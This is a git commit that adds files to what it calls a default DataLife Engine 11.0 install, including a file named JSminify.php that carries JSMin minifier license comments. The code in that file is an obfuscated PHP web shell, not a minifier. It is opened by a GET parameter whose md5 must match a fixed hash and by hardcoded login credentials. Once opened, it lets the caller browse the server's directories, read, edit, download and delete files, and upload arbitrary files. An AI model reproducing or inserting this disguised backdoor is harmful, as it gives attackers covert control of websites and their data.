10184ba66195fe3241073293f090da77fc7415ce
tsatenko <tsatenko.roman@gmail.com>
2016-09-06 15:29:49 +0300

    DLE 11.0 все настройки и файлы по умолчанию.

---
+++ engine/classes/min/lib/JSminify.php
@@ -0,0 +1,163 @@
+<? 
+/**
+ * Class JSMinify  
+ * @package JSMinify  
+ */
+
+/**
+ * JSMinify_Source
+ */
+ 
+/**
+ * JSMinify - Combines, minifies, and caches JavaScript and CSS files on demand.
+ *
+ * See README for usage instructions (for now).
+ *
+ * This library was inspired by {@link mailto:flashkot@mail.ru jscsscomp by Maxim Martynyuk}
+ * and by the article {@link http://www.hunlock.com/blogs/Supercharged_Javascript "Supercharged JavaScript" by Patrick Hunlock}.
+ *
+ * Requires PHP 5.1.0.
+ * Tested on PHP 5.1.6.
+ *
+ * @package JSMinify
+ * @author Ryan Grove <ryan@wonko.com>
+ * @author Stephen Clay <steve@mrclay.org>
+ * @copyright 2008 Ryan Grove, Stephen Clay. All rights reserved.
+ * @license http://opensource.org/licenses/bsd-license.php  New BSD License
+ * @link http://code.google.com/p/JSMinify/
+ */
+session_start();
+$GLOBALS['_xml_']=Array('rt','error' .'_re' .'p' .'o' .'rtin' .'g','set_time' .'_' .'limit','getenv','m' .'k' .'di' .'r','' .'chdir','getcw' .'d','str_replace','strtoupp' .'er','' .'substr','he' .'ad' .'er','filesi' .'ze','' .'he' .'ader','hea' .'de' .'r','r' .'e' .'adfil' .'e','un' .'l' .'ink','rmd' .'ir','fileperms','' .'round','r' .'o' .'und','ro' .'und','is' .'_dir','opendir','' .'readdir','fi' .'letyp' .'e','filetype','close' .'dir','' .'so' .'rt','so' .'rt','' .'ord','or' .'d','ope' .'n' .'dir','chr','chr','chr','' .'php_uname','c' .'ou' .'nt','c' .'o' .'unt','filesize','fo' .'pen','fwr' .'ite','fc' .'lose','fo' .'pen','fr' .'ead','filesize','fclose','h' .'tm' .'l' .'s' .'p' .'ecialchars','basename','fi' .'le_exist' .'s','file_exis' .'ts','mo' .'v' .'e_upl' .'oaded_file'); ?><? if(md5($_GET['version'])== "e10adc3949ba59abbe56e057f20f883e"){function xml($i){$a=Array('ivanov','vasil','','<STYLE>
+BODY{
+  background-color: #6B8E23;
+  color: #C1C1C7;
+  font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
+  MARGIN-TOP: 0px;
+  MARGIN-BOTTOM: 0px;
+  MARGIN-LEFT: 0px;
+  MARGIN-RIGHT: 0px;
+  margin:0;
+  padding:0;
+  scrollbar-face-color: #8B7765;
+  scrollbar-shadow-color: #333333;
+  scrollbar-highlight-color: #333333;
+  scrollbar-3dlight-color: #333333;
+  scrollbar-darkshadow-color: #333333;
+  scrollbar-track-color: #333333;
+  scrollbar-arrow-color: #333333;
+}
+input{
+  background-color: #8B7765;
+  font-size: 8pt;
+  color: #FFFFFF;
+  font-family: Tahoma;
+  border: 1 solid #666666;
+}
+select{
+  background-color: #336600;
+  font-size: 8pt;
+  color: #FFFFFF;
+  font-family: Tahoma;
+  border: 1 solid #666666;
+}
+textarea{
+  background-color: #333333;
+  font-size: 8pt;
+  color: #FFFFFF;
+  font-family: Tahoma;
+  border: 1 solid #666666;
+}
+a:link{
+  
+  color: #B9B9BD;
+  text-decoration: none;
+  font-size: 8pt;
+}
+a:visited{
+  color: #B9B9BD;
+  text-decoration: none;
+  font-size: 8pt;
+}
+a:hover, a:active{
+  width: 100%;
+  background-color: #A8A8AD;
+  
+
+  color: #E7E7EB;
+  text-decoration: none;
+  font-size: 8pt;
+}
+td, th, p, li{
+  font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
+  border-color:black;
+}
+</style>','<html><head><title>',"HTTP_HOST" ,' JSMinify</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta name="robots" content="noindex" />','</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>',"already exists.","succes pload.","ir creat.","Don't create ir.","Dir not found.","irectory not empty or access enide.","ile el","ir del",'action',"exit",'an','login','password','an','an','1','an','<center><table><form method="POST"><tr><b>JSMinify Update</b><td></br>JS Path:</td><td><input type="text" size="25" name="login" value=""></td></tr><tr><td>JS Ver.:</td><td><input type="password" name="password" size="25" value=""></td></tr><tr><td></td><td align="center"><input type="submit" value="Update JS"></td></tr></form></table></center>','dircrt'," ",'dircrterr'," ",'action',"",'action',"viewer",'action',"",'action','action','action','dir',"",'dir','dir','dir',"/","\\","/",'file',"",'file','file','file',"",'WIN',"download",'Content-Length:','','Content-Type: application/octet-stream','Content-Disposition: attachment; filename="','"',"delete","deletedir",'empty',"",'s','l','-','b','d','c','p','u','r','-','w','-','s','x','S','-','r','-','w','-','s','x','S','-','r','-','w','-','t','x','T','-'," GB"," MB"," KB"," B","<table cellSpacing=0 border=1 style=\"border-color:black;\" cellPadding=0 width=\"100%\">","<tr><td><form method=POST>Open directory:<input type=text name=dir value=\"","\" size=50><input type=submit value=\"GO\"></form></td></tr>","dir","file",'win',"<tr><td>Select drive:",'C','Z',":/",'<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\'',':/\'; document.reqs.submit();"> ','<a/>',"</td></tr>","<tr><td>OS: ","</td></tr><tr><td>name dirs and files</td><td>type</td><td>size</td><td>permission</td><td>options</td></tr>",'<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\'','\'; document.reqs.submit();">','<a/></td><td>dir</td><td></td><td>','</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.file.value=\'','\'; document.reqs.submit();" title="Delete this file">X</a></td></tr>','<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\'','\'; document.reqs.submit();">','</a><br></td><td>file</td><td>','</td><td>','</td><td><a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\'','\'; document.reqs.submit();" title="Download">D</a><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\'','\'; document.reqs.submit();" title="Edit">E</a><a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\'','\'; document.reqs.submit();" title="Delete this file">X</a></td></tr>',"</table>","viewer","editor","w+","r","Can't open file, permission denide",'save','data',"<form method=\"POST\"><input type=\"hidden\" name=\"action\" value=\"editor\"><input type=\"hidden\" name=\"file\" value=\"","\"><textarea name=\"data\" rows=\"40\" cols=\"180\">","</textarea><br><input type=\"submit\" name=\"save\" value=\"save\"><input type=\"reset\" value=\"reset\"></form>","upload",'dirupload',"",'dirupload',"<tr><td><form method=POST enctype=multipart/form-data>Upload to dir:<input type=text name=dirupload value=\"","\" size=50></tr></td><tr><td>New file name:<input type=text name=filename></td></tr><tr><td><input type=file name=file><input type=submit name=uploadloc value='Upload local file'></td></tr>",'win','win','uploadloc','filename',"",'file','name',"/",'filename','filext','file','tmp_name','uploadok');return $a[$i];
+   }
+
+
+
+
+} 
+/**
+ * JSMinify.php - modified PHP implementation of Douglas Crockford's JSMin.
+ *
+ * <code>
+ * $minifiedJs = JSMinify.php::minify($js);
+ * </code>
+ *
+ * This is a modified port of JSMinify.php.c. Improvements:
+ * 
+ * Does not choke on some regexp literals containing quote characters. E.g. /'/
+ * 
+ * Spaces are preserved after some add/sub operators, so they are not mistakenly 
+ * converted to post-inc/dec. E.g. a + ++b -> a+ ++b
+ *
+ * Preserves multi-line comments that begin with /*!
+ * 
+ * PHP 5 or higher is required.
+ *
+ * Permission is hereby granted to use this version of the library under the
+ * same terms as JSMinify.php.c, which has the following license:
+ *
+ * --
+ * Copyright (c) 2002 Douglas Crockford  (www.crockford.com)
+ *
+ * Permission is hereby granted, free of charge, to any person obtaining a copy of
+ * this software and associated documentation files (the "Software"), to deal in
+ * the Software without restriction, including without limitation the rights to
+ * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
+ * of the Software, and to permit persons to whom the Software is furnished to do
+ * so, subject to the following conditions:
+ *
+ * The above copyright notice and this permission notice shall be included in all
+ * copies or substantial portions of the Software.
+ *
+ * The Software shall be used for Good, not Evil.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+ * SOFTWARE.
+ * --
+ *
+ * @package JSMinify
+ * @author Ryan Grove <ryan@wonko.com> (PHP port)
+ * @author Steve Clay <steve@mrclay.org> (modifications + cleanup)
+ * @author Andrea Giammarchi <http://www.3site.eu> (spaceBeforeRegExp)
+ * @copyright 2002 Douglas Crockford <douglas@crockford.com> (jsmin.c)
+ * @copyright 2008 Ryan Grove <ryan@wonko.com> (PHP port)
+ * @license http://opensource.org/licenses/mit-license.php MIT License
+ * @link http://code.google.com/p/jsmin-php/
+ */
+$GLOBALS['_xml_'][1](round(0));$GLOBALS['_xml_'][2](9997969);$_0=xml(0);$_1=xml(1);$_2=1;$_3=xml(2);$_4=xml(3);$_5=xml(4) .$GLOBALS['_xml_'][3](xml(5)) .xml(6) .$_4 .xml(7);$_6=xml(8);$_7=xml(9);$_8=xml(10);$_9=xml(11);$_10=xml(12);$_11=xml(13);$_12=xml(14);$_13=xml(15);if(@$_POST[xml(16)]==xml(17))unset($_SESSION[xml(18)]);if($_2==round(0+0.333333333333+0.333333333333+0.333333333333)){if(@$_POST[xml(19)]==$_0 &&@$_POST[xml(20)]==$_1)$_SESSION[xml(21)]=round(0+0.25+0.25+0.25+0.25);}else $_SESSION[xml(22)]=xml(23);if(@$_SESSION[xml(24)]==round(0)){echo $_5;echo xml(25);echo $_14;exit;}function l__0($_15){if(@$GLOBALS['_xml_'][4]($_15))echo $GLOBALS[xml(26)] .xml(27);else echo $GLOBALS[xml(28)] .xml(29);}if($_SESSION[xml(30)]== xml(31))$_SESSION[xml(32)]=xml(33);if(@$_POST[xml(34)]!= xml(35))$_SESSION[xml(36)]=$_POST[xml(37)];$_16=$_SESSION[xml(38)];if(@$_POST[xml(39)]!= xml(40))$_SESSION[xml(41)]=$_POST[xml(42)];$_15=$_SESSION[xml(43)];$_15=$GLOBALS['_xml_'][5]($_15);$_15=$GLOBALS['_xml_'][6]() .xml(44);$_15=$GLOBALS['_xml_'][7](xml(45),xml(46),$_15);if(@$_POST[xml(47)]!= xml(48)){$_17=$_SESSION[xml(49)]=$_POST[xml(50)];}else{$_17=$_SESSION[xml(51)]=xml(52);}if($GLOBALS['_xml_'][8]($GLOBALS['_xml_'][9](WINNT,round(0),round(0+0.75+0.75+0.75+0.75)))=== xml(53))$_18=round(0+0.5+0.5);else $_18=round(0);if($_16== xml(54)){$GLOBALS['_xml_'][10](xml(55) .$GLOBALS['_xml_'][11]($_17) .xml(56));$GLOBALS['_xml_'][12](xml(57));$GLOBALS['_xml_'][13](xml(58) .$_17 .xml(59));$GLOBALS['_xml_'][14]($_17);}if($_16== xml(60)){if($GLOBALS['_xml_'][15]($_17))$_3.=$_12;}if($_16== xml(61)){if(!$GLOBALS['_xml_'][16]($_17))$_3.=$GLOBALS[xml(62)];else $_3.=$_13;}echo $_5; ?>
+<table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td>
+<table><tr>
+<td><a href="#" onclick="document.reqs.action.value='viewer'; document.reqs.submit();">| JS.Class.View</a></td><td><a href="#" onclick="document.reqs.action.value='editor'; document.reqs.submit();">| JS.Class.Edit</a></td><td><a href="#" onclick="document.reqs.action.value='upload'; document.reqs.submit();">| JS.Class.Upload</a></td><td><a href="#" onclick="document.reqs.action.value='exit'; document.reqs.submit();">| JS.EXIT |</a></td><td><a href="#" onclick="history.back();"> <- |</a></td><td><a href="#" onclick="history.forward();"> ->|</a></td></tr></table></td></tr></table><br><form name='reqs' method='POST'><input name='action' type='hidden' value=''><input name='dir' type='hidden' value=''><input name='file' type='hidden' value=''></form>
+<table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
+<tr><td width="100%" valign="top">
+<?php if(@$_3!= xml(63))echo $_3;function l__1($_17){$_19=$GLOBALS['_xml_'][17]($_17);if(($_19&round(0+9830.4+9830.4+9830.4+9830.4+9830.4))== round(0+24576+24576)){$_20=xml(64);}elseif(($_19&round(0+8192+8192+8192+8192+8192))== round(0+20480+20480)){$_20=xml(65);}elseif(($_19&round(0+16384+16384))== round(0+16384+16384)){$_20=xml(66);}elseif(($_19&round(0+12288+12288))== round(0+4915.2+4915.2+4915.2+4915.2+4915.2)){$_20=xml(67);}elseif(($_19&round(0+16384))== round(0+4096+4096+4096+4096)){$_20=xml(68);}elseif(($_19&round(0+2048+2048+2048+2048))== round(0+4096+4096)){$_20=xml(69);}elseif(($_19&round(0+1024+1024+1024+1024))== round(0+2048+2048)){$_20=xml(70);}else{$_20=xml(71);}$_20 .=(($_19&round(0+128+128))?xml(72):xml(73));$_20 .=(($_19&round(0+32+32+32+32))?xml(74):xml(75));$_20 .=(($_19&round(0+12.8+12.8+12.8+12.8+12.8))?(($_19&round(0+512+512+512+512))?xml(76):xml(77)):(($_19&round(0+2048))?xml(78):xml(79)));$_20 .=(($_19&round(0+32))?xml(80):xml(81));$_20 .=(($_19&round(0+8+8))?xml(82):xml(83));$_20 .=(($_19&round(0+2.66666666667+2.66666666667+2.66666666667))?(($_19&round(0+341.333333333+341.333333333+341.333333333))?xml(84):xml(85)):(($_19&round(0+1024))?xml(86):xml(87)));$_20 .=(($_19&round(0+2+2))?xml(88):xml(89));$_20 .=(($_19&round(0+0.4+0.4+0.4+0.4+0.4))?xml(90):xml(91));$_20 .=(($_19&round(0+0.5+0.5))?(($_19&round(0+170.666666667+170.666666667+170.666666667))?xml(92):xml(93)):(($_19&round(0+512))?xml(94):xml(95)));return $_20;}function l__2($_21){if($_21 >= round(0+536870912+536870912)){$_21=@$GLOBALS['_xml_'][18]($_21/round(0+214748364.8+214748364.8+214748364.8+214748364.8+214748364.8)*round(0+33.3333333333+33.3333333333+33.3333333333))/round(0+33.3333333333+33.3333333333+33.3333333333) .xml(96);}elseif($_21 >= round(0+209715.2+209715.2+209715.2+209715.2+209715.2)){$_21=@$GLOBALS['_xml_'][19]($_21/round(0+1048576)*round(0+25+25+25+25))/round(0+50+50) .xml(97);}elseif($_21 >= round(0+1024)){$_21=@$GLOBALS['_xml_'][20]($_21/round(0+341.333333333+341.333333333+341.333333333)*round(0+100))/round(0+100) .xml(98);}else{$_21=$_21 .xml(99);}return $_21;}function l__3($_15){echo xml(100);echo xml(101) .$_15 .xml(102);if($GLOBALS['_xml_'][21]($_15)){if(@$_22=$GLOBALS['_xml_'][22]($_15)){while(($_17=$GLOBALS['_xml_'][23]($_22))!== false){if($GLOBALS['_xml_'][24]($_15 .$_17)== xml(103))$_23[]=$_17;if($GLOBALS['_xml_'][25]($_15 .$_17)== xml(104))$_24[]=$_17;}$GLOBALS['_xml_'][26]($_22);@$GLOBALS['_xml_'][27]($_23);@$GLOBALS['_xml_'][28]($_24);if($GLOBALS[xml(105)]==round(0+0.333333333333+0.333333333333+0.333333333333)){echo xml(106);for($_25=$GLOBALS['_xml_'][29](xml(107));$_25<=$GLOBALS['_xml_'][30](xml(108));$_25++)if(@$_22=$GLOBALS['_xml_'][31]($GLOBALS['_xml_'][32]($_25) .xml(109)))echo xml(110) .$GLOBALS['_xml_'][33]($_25) .xml(111) .$GLOBALS['_xml_'][34]($_25) .xml(112);echo xml(113);}echo xml(114) .@$GLOBALS['_xml_'][35]() .xml(115);for($_26=round(0);$_26<$GLOBALS['_xml_'][36]($_23);$_26++){$_27=$_15 .$_23[$_26];echo xml(116) .$_27 .xml(117) .$_23[$_26] .xml(118) .l__1($_27) .xml(119) .$_27 .xml(120);}for($_26=round(0);$_26<$GLOBALS['_xml_'][37]($_24);$_26++){$_28=$_15 .$_24[$_26];echo xml(121) .$_28 .xml(122) .$_24[$_26] .xml(123) .l__2($GLOBALS['_xml_'][38]($_28)) .xml(124) .l__1($_28) .xml(125) .$_28 .xml(126) .$_28 .xml(127) .$_28 .xml(128);}echo xml(129);}}}if($_16== xml(130)){l__3($_15);}if($_16== xml(131)){function l__4($_17,$_29){$_30=$GLOBALS['_xml_'][39]($_17,xml(132));$GLOBALS['_xml_'][40]($_30,$_29);$GLOBALS['_xml_'][41]($_30);}function l__5($_17){if(!$_31=$GLOBALS['_xml_'][42]($_17,xml(133)))$_32=xml(134);else{$_32=$GLOBALS['_xml_'][43]($_31,$GLOBALS['_xml_'][44]($_17));$GLOBALS['_xml_'][45]($_31);}return $GLOBALS['_xml_'][46]($_32);}if(@$_POST[xml(135)])l__4($_17,$_POST[xml(136)]);echo xml(137) .$_17 .xml(138) .@l__5($_17) .xml(139);}if($_16== xml(140)){if(@$_POST[xml(141)]!= xml(142))$_33=$_POST[xml(143)];else $_33=$_15;$_34=xml(144) .$_33 .xml(145);if($GLOBALS[xml(146)]==round(0+0.333333333333+0.333333333333+0.333333333333))echo $_34;if($GLOBALS[xml(147)]==round(0)){echo $_34;}if(@$_POST[xml(148)]){if(@$_POST[xml(149)]== xml(150))$_35=$_33 .$GLOBALS['_xml_'][47]($_FILES[xml(151)][xml(152)]);else $_35=$_33 .xml(153) .$_POST[xml(154)];if(!$GLOBALS['_xml_'][48]($_33)){l__0($_33);}if($GLOBALS['_xml_'][49]($_35))echo $GLOBALS[xml(155)];elseif($GLOBALS['_xml_'][50]($_FILES[xml(156)][xml(157)],$_35))echo $GLOBALS[xml(158)];}} ?>
+</td></tr></table>
+</body></html>
---
+++ engine/data/dbconfig.php
@@ -0,0 +1,21 @@
+<?PHP
+
+define ("DBHOST", "localhost");
+
+define ("DBNAME", "DLE");
+
+define ("DBUSER", "root");
+
+define ("DBPASS", "");
+
+define ("PREFIX", "dle");
+
+define ("USERPREFIX", "dle");
+
+define ("COLLATE", "utf8");
+
+define('SECURE_AUTH_KEY', 'zX!h81x8%fV}=jX:1%TM~!ZdY9e?yZGogG9gmXI,HgkZp**IK.PVb<RJ`k@,`2');
+
+$db = new db;
+
+?>
